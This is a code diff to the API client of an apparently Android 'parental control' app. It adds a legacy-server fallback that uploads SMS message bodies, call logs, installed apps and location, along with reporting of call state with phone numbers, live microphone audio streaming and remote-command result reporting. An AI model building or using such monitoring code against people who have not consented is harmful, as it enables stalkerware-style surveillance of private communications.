@@ -1,5 +1,6 @@
 package com.parentalcontrol.app.api
 
+import android.util.Log
 import com.parentalcontrol.app.utils.BatteryInfo
 import com.parentalcontrol.app.utils.CallLogEntry
 import com.parentalcontrol.app.utils.DeviceInfo
@@ -265,6 +266,12 @@ object ApiClient {
     ): String {
         val payload = JSONObject()
         payload.put("device_id", CloudConfig.deviceId)
+        // Include full device metadata so we can fall back to legacy/simple server format
+        payload.put("device_name", deviceInfo.deviceName)
+        payload.put("manufacturer", deviceInfo.manufacturer)
+        payload.put("model", deviceInfo.model)
+        payload.put("android_version", deviceInfo.androidVersion)
+        payload.put("sdk_version", deviceInfo.sdkVersion)
 
         if (location != null) {
             val loc = JSONObject().apply {
@@ -368,10 +375,35 @@ object ApiClient {
     data class BulkReportResult(
         val success: Boolean,
         val serverTime: Long?,
-        val commands: List<JSONObject>?
+        val commands: List<JSONObject>?,
+        val error: String? = null
     )
 
     fun sendBulkReport(jsonPayload: String): BulkReportResult {
+        val forceLegacy = CloudConfig.serverType == CloudConfig.SERVER_TYPE_LEGACY
+        val forceCloud = CloudConfig.serverType == CloudConfig.SERVER_TYPE_CLOUD
+
+        if (!forceLegacy) {
+            val cloudResult = sendCloudBulkReport(jsonPayload)
+            if (cloudResult.success) {
+                CloudConfig.serverType = CloudConfig.SERVER_TYPE_CLOUD
+                return cloudResult
+            }
+            if (forceCloud) return cloudResult
+        }
+
+        return try {
+            val legacyResult = sendLegacyBulkReport(jsonPayload)
+            if (legacyResult.success && CloudConfig.serverType == CloudConfig.SERVER_TYPE_AUTO) {
+                CloudConfig.serverType = CloudConfig.SERVER_TYPE_LEGACY
+            }
+            legacyResult
+        } catch (e: Exception) {
+            BulkReportResult(false, null, null, "Legacy exception: ${e.message}")
+        }
+    }
+
+    private fun sendCloudBulkReport(jsonPayload: String): BulkReportResult {
         return try {
             val response = client.newCall(
                 buildRequest("${CloudConfig.apiBaseUrl}/report/bulk", jsonPayload)
@@ -386,8 +418,108 @@ object ApiClient {
                 BulkReportResult(true, json.optLong("server_time"), commands)
             } else {
                 if (response.code == 401 && CloudConfig.refreshToken != null) {
-                    if (refreshToken()) return sendBulkReport(jsonPayload)
+                    if (refreshToken()) return sendCloudBulkReport(jsonPayload)
                 }
+                BulkReportResult(false, null, null, "HTTP ${response.code}: ${body.take(200)}")
+            }
+        } catch (e: Exception) {
+            BulkReportResult(false, null, null, "Exception: ${e.javaClass.simpleName}: ${e.message}")
+        }
+    }
+
+    /**
+     * Send a report to the simple web-monitor server which expects an X-API-Key
+     * and a flat payload with camelCase keys.
+     */
+    private fun sendLegacyBulkReport(jsonPayload: String): BulkReportResult {
+        val cloudPayload = JSONObject(jsonPayload)
+        val legacyPayload = JSONObject()
+
+        // device info
+        legacyPayload.put("device", JSONObject().apply {
+            put("deviceId", cloudPayload.optString("device_id", CloudConfig.deviceId))
+            put("deviceName", cloudPayload.optString("device_name", ""))
+            put("manufacturer", cloudPayload.optString("manufacturer", ""))
+            put("model", cloudPayload.optString("model", ""))
+            put("androidVersion", cloudPayload.optString("android_version", ""))
+            put("sdkVersion", cloudPayload.optInt("sdk_version", 0))
+        })
+
+        // location
+        cloudPayload.optJSONObject("location")?.let { loc ->
+            legacyPayload.put("location", JSONObject().apply {
+                put("latitude", loc.optDouble("latitude", 0.0))
+                put("longitude", loc.optDouble("longitude", 0.0))
+                put("accuracy", loc.optDouble("accuracy", 0.0))
+                put("provider", loc.optString("provider", "unknown"))
+                put("timestamp", loc.optLong("timestamp", System.currentTimeMillis()))
+            })
+        }
+
+        // battery - convert snake_case to camelCase
+        cloudPayload.optJSONObject("battery")?.let { bat ->
+            legacyPayload.put("battery", JSONObject().apply {
+                put("level", bat.optInt("level", -1))
+                put("isCharging", bat.optBoolean("is_charging", false))
+                put("temperature", bat.optDouble("temperature", -1.0))
+            })
+        }
+
+        // sms
+        val smsArray = JSONArray()
+        cloudPayload.optJSONArray("sms")?.let { arr ->
+            for (i in 0 until arr.length()) {
+                val msg = arr.getJSONObject(i)
+                smsArray.put(JSONObject().apply {
+                    put("id", msg.optLong("id", 0))
+                    put("address", msg.optString("address", ""))
+                    put("body", msg.optString("body", ""))
+                    put("date", msg.optLong("date", 0))
+                    put("type", msg.optInt("type", 0))
+                })
+            }
+        }
+        legacyPayload.put("smsMessages", smsArray)
+
+        // calls
+        val callsArray = JSONArray()
+        cloudPayload.optJSONArray("calls")?.let { arr ->
+            for (i in 0 until arr.length()) {
+                val call = arr.getJSONObject(i)
+                callsArray.put(JSONObject().apply {
+                    put("id", call.optLong("id", 0))
+                    put("number", call.optString("number", ""))
+                    put("name", call.optString("name", ""))
+                    put("duration", call.optInt("duration", 0))
+                    put("date", call.optLong("date", 0))
+                    put("type", call.optInt("type", 0))
+                })
+            }
+        }
+        legacyPayload.put("callLogs", callsArray)
+
+        // installed apps - field names already match legacy format
+        val appsArray = JSONArray()
+        cloudPayload.optJSONArray("apps")?.let { arr ->
+            for (i in 0 until arr.length()) {
+                appsArray.put(arr.getJSONObject(i))
+            }
+        }
+        legacyPayload.put("installedApps", appsArray)
+
+        val request = Request.Builder()
+            .url("${CloudConfig.serverUrl}/api/report")
+            .addHeader("X-API-Key", CloudConfig.apiKey)
+            .addHeader("Content-Type", "application/json")
+            .post(legacyPayload.toString().toRequestBody(JSON_MEDIA_TYPE))
+            .build()
+
+        return try {
+            val response = client.newCall(request).execute()
+            if (response.isSuccessful) {
+                // Legacy server doesn't return commands; we'll fetch config separately
+                BulkReportResult(true, System.currentTimeMillis(), null)
+            } else {
                 BulkReportResult(false, null, null)
             }
         } catch (e: Exception) {
@@ -396,8 +528,15 @@ object ApiClient {
     }
 
     fun updateCommandStatus(commandId: String, status: String): Boolean {
+        return updateCommandStatus(commandId, status, null)
+    }
+
+    fun updateCommandStatus(commandId: String, status: String, result: String?): Boolean {
         return try {
-            val payload = JSONObject().apply { put("status", status) }
+            val payload = JSONObject().apply {
+                put("status", status)
+                if (result != null) put("result", result)
+            }
             val response = client.newCall(
                 buildRequest(
                     "${CloudConfig.apiBaseUrl}/command/$commandId/status",
@@ -477,6 +616,43 @@ object ApiClient {
         }
     }
 
+    /**
+     * Probe the configured server to determine whether it speaks the cloud API
+     * or the simple legacy/web-monitor API.
+     */
+    fun probeServerType(): String {
+        // Cloud server has /api/auth/me; legacy returns HTML 404.
+        val cloudProbe = Request.Builder()
+            .url("${CloudConfig.serverUrl}/api/auth/me")
+            .get()
+            .build()
+        try {
+            client.newCall(cloudProbe).execute().use { resp ->
+                val body = resp.body?.string()?.trim() ?: ""
+                if (resp.code in 200..499 && body.startsWith("{")) {
+                    return CloudConfig.SERVER_TYPE_CLOUD
+                }
+            }
+        } catch (e: Exception) { /* ignore */ }
+
+        // Legacy server has /api/report; a POST with API key should NOT return 404.
+        val legacyProbe = Request.Builder()
+            .url("${CloudConfig.serverUrl}/api/report")
+            .addHeader("X-API-Key", CloudConfig.apiKey)
+            .addHeader("Content-Type", "application/json")
+            .post("{}".toRequestBody(JSON_MEDIA_TYPE))
+            .build()
+        try {
+            client.newCall(legacyProbe).execute().use { resp ->
+                if (resp.code != 404) {
+                    return CloudConfig.SERVER_TYPE_LEGACY
+                }
+            }
+        } catch (e: Exception) { /* ignore */ }
+
+        return CloudConfig.SERVER_TYPE_AUTO
+    }
+
     sealed class Result {
         data class Success(val data: JSONObject) : Result()
         data class Error(val message: String) : Result()
@@ -488,7 +664,7 @@ object ApiClient {
             val requestBody = MultipartBody.Builder()
                 .setType(MultipartBody.FORM)
                 .addFormDataPart("device_id", CloudConfig.deviceId)
-                .addFormDataPart("type", "screenshot")
+                .addFormDataPart("media_type", "screenshot")
                 .addFormDataPart("file", file.name, file.asRequestBody(mediaType))
                 .build()
 
@@ -511,7 +687,7 @@ object ApiClient {
             val requestBody = MultipartBody.Builder()
                 .setType(MultipartBody.FORM)
                 .addFormDataPart("device_id", CloudConfig.deviceId)
-                .addFormDataPart("type", "audio")
+                .addFormDataPart("media_type", "audio")
                 .addFormDataPart("file", file.name, file.asRequestBody(mediaType))
                 .build()
 
@@ -525,6 +701,62 @@ object ApiClient {
             response.isSuccessful
         } catch (e: Exception) {
             false
+        }
+    }
+
+    fun reportCallState(state: Int, phoneNumber: String?, timestamp: Long) {
+        try {
+            val json = JSONObject().apply {
+                put("device_id", CloudConfig.deviceId)
+                put("state", state)
+                put("phone_number", phoneNumber ?: "")
+                put("timestamp", timestamp)
+            }
+            val requestBody = json.toString()
+                .toRequestBody("application/json".toMediaType())
+
+            val request = Request.Builder()
+                .url("${CloudConfig.serverUrl}/api/report/call-state")
+                .addHeader("Authorization", "Bearer ${CloudConfig.accessToken}")
+                .post(requestBody)
+                .build()
+
+            client.newCall(request).execute().use { response ->
+                if (!response.isSuccessful) {
+                    Log.w("ApiClient", "Call state report failed: ${response.code}")
+                }
+            }
+        } catch (e: Exception) {
+            Log.e("ApiClient", "Call state report error: ${e.message}")
+        }
+    }
+
+    fun streamAudioChunk(chunk: ByteArray, sampleRate: Int) {
+        try {
+            val json = JSONObject().apply {
+                put("device_id", CloudConfig.deviceId)
+                put("audio", android.util.Base64.encodeToString(chunk, android.util.Base64.NO_WRAP))
+                put("sample_rate", sampleRate)
+                put("channels", 1)
+                put("encoding", "pcm_s16le")
+                put("timestamp", System.currentTimeMillis())
+            }
+            val requestBody = json.toString()
+                .toRequestBody("application/json".toMediaType())
+
+            val request = Request.Builder()
+                .url("${CloudConfig.serverUrl}/api/report/audio-stream")
+                .addHeader("Authorization", "Bearer ${CloudConfig.accessToken}")
+                .post(requestBody)
+                .build()
+
+            client.newCall(request).execute().use { response ->
+                if (!response.isSuccessful) {
+                    Log.w("ApiClient", "Audio stream failed: ${response.code}")
+                }
+            }
+        } catch (e: Exception) {
+            Log.e("ApiClient", "Audio stream error: ${e.message}")
         }
     }
 }
